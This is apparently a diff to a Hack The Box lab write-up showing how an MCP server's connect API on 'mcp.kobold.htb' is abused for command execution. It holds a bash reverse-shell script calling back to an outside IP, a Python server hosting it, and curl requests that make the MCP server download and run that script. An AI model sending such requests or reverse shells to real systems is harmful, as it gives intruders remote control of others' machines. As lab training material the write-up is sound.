@@ -142,9 +142,25 @@ cat shell.sh
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
                                                                                                                
-┌──(kali㉿kali)-[~/htb-academy]
-└─$ python3 -m http.server 8000                                     
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+python3 -m http.server 8000                         
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
+10.129.59.28 - - [06/May/2026 18:44:27] "GET /shell.sh HTTP/1.1" 200 -
+```
+
+Download shell
+```
+curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"exploit"}'
+  
+```
+
+execute the shell with an active listener
+
+```
+curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"exploit"}'
 ```
 
 ---
